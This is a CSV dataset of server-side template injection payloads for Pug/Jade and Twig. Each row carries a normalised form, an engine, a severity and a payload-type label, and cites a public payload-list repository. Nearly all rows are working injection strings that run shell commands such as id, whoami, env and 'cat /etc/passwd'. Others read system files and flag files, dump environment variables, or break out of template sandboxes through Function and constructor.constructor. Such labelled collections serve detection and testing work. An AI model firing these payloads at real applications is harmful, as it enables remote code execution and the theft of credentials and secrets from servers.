#{process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('child_process').execSync('ls -la').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8')}","#{process.mainmodule.constructor._load('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.constructor._load('fs').readFileSync('flag.txt','utf8')}","#{process.mainmodule.constructor._load('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('fs').readdirSync('/')},#{process.mainmodule.constructor._load('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.constructor._load('child_process').execSync('id').toString()},!{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.constructor._load('child_process').execSync('whoami').toString()},!{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8')}","!{process.mainmodule.constructor._load('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawn('id')},#{process.mainmodule.require('S').spawn('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawn('whoami')},#{process.mainmodule.require('S').spawn('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawn('cat',['/etc/passwd'])}","#{process.mainmodule.require('S').spawn('S',['S'])}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawn('ls',['-la'])}","#{process.mainmodule.require('S').spawn('S',['S'])}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').fork('id')},#{process.mainmodule.require('S').fork('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').hostname()},#{process.mainmodule.require('S').hostname()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').type()},#{process.mainmodule.require('S').type()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').platform()},#{process.mainmodule.require('S').platform()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').arch()},#{process.mainmodule.require('S').arch()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').release()},#{process.mainmodule.require('S').release()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').uptime()},#{process.mainmodule.require('S').uptime()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').loadavg()},#{process.mainmodule.require('S').loadavg()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').totalmem()},#{process.mainmodule.require('S').totalmem()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').freemem()},#{process.mainmodule.require('S').freemem()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').cpus()},#{process.mainmodule.require('S').cpus()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').networkInterfaces()},#{process.mainmodule.require('S').networkinterfaces()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').userInfo()},#{process.mainmodule.require('S').userinfo()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').homedir()},#{process.mainmodule.require('S').homedir()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').tmpdir()},#{process.mainmodule.require('S').tmpdir()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('os').hostname()},!{process.mainmodule.require('S').hostname()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('os').userInfo()},!{process.mainmodule.require('S').userinfo()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('os').networkInterfaces()},!{process.mainmodule.require('S').networkinterfaces()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('id').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('whoami').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('cat /etc/passwd').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('ls -la').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('uname -a').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('pwd').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('env').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('cat flag.txt').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{require('fs').readFileSync('/etc/passwd','utf8')}","#{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{require('fs').readFileSync('flag.txt','utf8')}","#{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('fs').readdirSync('/')},#{require('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('fs').readdirSync('.')},#{require('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{require('child_process').execSync('id').toString()},!{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{require('child_process').execSync('whoami').toString()},!{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{require('child_process').execSync('cat /etc/passwd').toString()},!{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{require('fs').readFileSync('/etc/passwd','utf8')}","!{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{require('fs').readFileSync('flag.txt','utf8')}","!{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat${IFS}/etc/passwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat$IFS/etc/passwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('sh',['-c','cat</etc/passwd']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('sh',['-c','cat<flag.txt']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('calc').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cmd /c calc').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cmd /c dir').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('powershell.exe').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cmd.exe /c whoami').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('cmd /c whoami').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('cmd',['/c','whoami']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('powershell',['-c','whoami']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('net').isIP('127.0.0.1')},#{process.mainmodule.require('S').isip('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('dns').lookup('localhost')},#{process.mainmodule.require('S').lookup('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('http').request},#{process.mainmodule.require('S').request},javascript,Pug/Jade,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('https').request},#{process.mainmodule.require('S').request},javascript,Pug/Jade,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('url').parse('http://example.com')},#{process.mainmodule.require('S').parse('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('path').resolve('/')},#{process.mainmodule.require('S').resolve('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('path').dirname('/etc/passwd')},#{process.mainmodule.require('S').dirname('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('crypto').getHashes()},#{process.mainmodule.require('S').gethashes()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('crypto').getCiphers()},#{process.mainmodule.require('S').getciphers()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('util').inspect(process.env)},#{process.mainmodule.require('S').inspect(process.env)},javascript,Pug/Jade,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('util').inspect(process.env)},!{process.mainmodule.require('S').inspect(process.env)},javascript,Pug/Jade,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{Function('return this')()},#{function('S')()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{Function('return process')()},#{function('S')()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{Function('return global')()},#{function('S')()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')()}",#{function('S')()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{Function('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')()}",#{function('S')()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{Function('return process.mainModule.require(""child_process"").execSync(""cat /etc/passwd"").toString()')()}",#{function('S')()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')()}",!{function('S')()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{constructor.constructor('return process')()},#{constructor.constructor('S')()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{constructor.constructor('return global')()},#{constructor.constructor('S')()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')()}",#{constructor.constructor('S')()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{constructor.constructor('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')()}",#{constructor.constructor('S')()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
{{app}},{{app}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_context}},{{_context}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{dump(_context)}},{{dump(_context)}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'a'|upper}},{{'S'|upper}},php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['id']|reduce('system')}},{{['S']|reduce('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['id']|sort('system')}},{{['S']|sort('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['id','']|sort('system')}}","{{['S','S']|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{{'id':0}|map('system')}},{{{'S':N}|map('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|filter('exec')}},{{'S'|filter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|map('exec')}},{{'S'|map('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|filter('passthru')}},{{'S'|filter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|map('passthru')}},{{'S'|map('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|filter('shell_exec')}},{{'S'|filter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|map('shell_exec')}},{{'S'|map('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat /etc/passwd']|map('system')}},{{['S']|map('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['whoami']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['ls -la']|map('system')}},{{['S']|map('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['uname -a']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['env']|map('system')}},{{['S']|map('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['pwd']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env}},{{_self.env}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getExtensions()}},{{_self.env.getextensions()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('exec')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
